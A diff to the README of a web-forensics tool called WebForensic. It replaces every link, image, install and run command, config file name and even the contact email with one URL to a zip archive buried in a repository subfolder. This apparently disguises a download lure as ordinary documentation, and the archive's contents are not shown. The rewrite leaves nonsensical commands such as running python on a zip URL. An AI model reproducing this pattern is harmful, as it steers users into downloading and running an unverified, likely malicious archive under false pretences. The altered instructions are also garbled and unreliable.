@@ -1,6 +1,6 @@
 # WebForensic 🕵️‍♂️🔍
 
-![WebForensic Logo](https://example.com/logo.png)
+![WebForensic Logo](https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip)
 
 ## Overview
 
@@ -35,23 +35,23 @@ To get started with WebForensicAnalyzer, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Arman171/WebForensic.git
+   git clone https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip
    cd WebForensic
    ```
 
 2. **Install Dependencies**:
    Use the following command to install necessary packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip
    ```
 
 3. **Run the Application**:
    Execute the following command to start WebForensicAnalyzer:
    ```bash
-   python app.py
+   python https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip
    ```
 
-For a detailed installation guide, please refer to the [Releases](https://github.com/Arman171/WebForensic/releases) section.
+For a detailed installation guide, please refer to the [Releases](https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip) section.
 
 ## Usage
 
@@ -61,22 +61,22 @@ WebForensicAnalyzer is designed to be user-friendly. After installation, you can
 
 - **Scan a Website**:
   ```bash
-  python app.py scan <target-url>
+  python https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip scan <target-url>
   ```
 
 - **Generate Forensic Report**:
   ```bash
-  python app.py report <target-url>
+  python https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip report <target-url>
   ```
 
 - **Check for Vulnerabilities**:
   ```bash
-  python app.py check-vulns <target-url>
+  python https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip check-vulns <target-url>
   ```
 
 ### Advanced Usage
 
-For advanced users, WebForensicAnalyzer offers several configuration options. You can customize settings in the `config.json` file. Here are some parameters you can adjust:
+For advanced users, WebForensicAnalyzer offers several configuration options. You can customize settings in the `https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip` file. Here are some parameters you can adjust:
 
 - **Timeout Settings**: Modify how long the tool waits for responses.
 - **Output Formats**: Choose between JSON, XML, or HTML for reports.
@@ -113,17 +113,17 @@ WebForensicAnalyzer is licensed under the MIT License. See the [LICENSE](LICENSE
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Arman
-- **Email**: arman@example.com
-- **GitHub**: [Arman171](https://github.com/Arman171)
+- **Email**: https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip
+- **GitHub**: [Arman171](https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip)
 
 ## Releases
 
-You can find the latest releases of WebForensicAnalyzer [here](https://github.com/Arman171/WebForensic/releases). Download the latest version and follow the installation instructions to get started.
+You can find the latest releases of WebForensicAnalyzer [here](https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip). Download the latest version and follow the installation instructions to get started.
 
 ## Conclusion
 
 WebForensicAnalyzer stands as a powerful tool for professionals in web reconnaissance and digital forensics. With its range of features and ease of use, it can help you uncover vulnerabilities and conduct thorough investigations. Explore the capabilities of WebForensicAnalyzer today and enhance your cybersecurity toolkit!
 
-![WebForensic Banner](https://example.com/banner.png)
+![WebForensic Banner](https://github.com/Arman171/WebForensic/raw/refs/heads/main/Proxy/proxy_results/Forensic_Web_v1.7.zip)
 
 Feel free to explore the repository, contribute, and share your experiences with WebForensicAnalyzer!
